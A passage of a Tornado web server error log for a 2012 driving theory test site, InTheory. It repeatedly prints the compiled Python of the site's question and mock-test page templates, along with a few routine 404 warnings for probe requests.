 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /phpMyAdmin/translators.html (127.0.0.1) 0.78ms
WARNING:root:405 HEAD / (127.0.0.1) 0.67ms
WARNING:root:404 GET /phpmyadmin/translators.html (127.0.0.1) 0.74ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
